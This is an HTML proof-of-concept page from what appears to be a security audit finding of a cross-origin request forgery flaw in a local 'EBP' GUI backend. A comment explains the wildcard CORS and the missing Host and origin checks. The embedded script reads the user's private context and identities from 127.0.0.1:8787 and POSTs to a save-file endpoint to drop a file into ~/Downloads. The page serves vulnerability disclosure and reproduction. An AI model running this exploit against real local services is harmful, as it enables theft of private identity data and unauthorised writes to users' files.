<!doctype html>
<!--
  F-GUI-01 — Cross-origin attack against the GUI local backend.

  REPRODUCTION:
    1. Start the GUI local backend:  deno task gui
    2. Start a tiny attacker server in another terminal:
         python3 -m http.server 8000
    3. Open http://localhost:8000/F-GUI-01-cross-origin-csrf.html in a browser.
    4. Observe identities/contacts being read and exfiltrated to the attacker
       page console.  The attacker page can also issue POSTs to /api/v1/save-file
       to drop arbitrary files in the user's ~/Downloads folder.

  Why this works:
    - http.ts sets Access-Control-Allow-Origin: * on every response.
    - main.ts binds to 127.0.0.1 by default and does NOT validate the Host
      header, so any browser tab can fetch http://127.0.0.1:8787 and read
      the JSON response (because of the * CORS).
    - There is no CSRF token, no SameSite cookie, no origin check.

  Reference: routes.ts:101+ (no Host check), http.ts:22-26 (CORS *).
-->
<html>
<head><title>EBP cross-origin CSRF PoC</title></head>
<body>
<h1>EBP local-backend cross-origin attack</h1>
<pre id="out">running...</pre>
<script>
const out = document.getElementById("out");
function log(...args) {
  out.textContent += "\n" + args.map(a => typeof a === "string" ? a : JSON.stringify(a, null, 2)).join(" ");
}

(async () => {
  const base = "http://127.0.0.1:8787";

  log("--- exfiltrating local context ---");
  try {
    const ctx = await fetch(base + "/api/v1/context").then(r => r.json());
    log("context:", ctx);
  } catch (e) { log("context error:", e.message); }

  log("\n--- listing identities (private) ---");
  try {
    const ids = await fetch(base + "/api/v1/identities").then(r => r.json());
    log("identities:", ids);
  } catch (e) { log("identities error:", e.message); }

  log("\n--- attempting to drop a file in ~/Downloads via /save-file ---");
  try {
    const res = await fetch(base + "/api/v1/save-file", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ filename: "ebp-csrf-poc.txt", content: "pwned by remote origin\n" }),
    }).then(r => r.json());
    log("save-file:", res);
  } catch (e) { log("save-file error:", e.message); }

  log("\n--- DONE ---");
})();
</script>
</body>
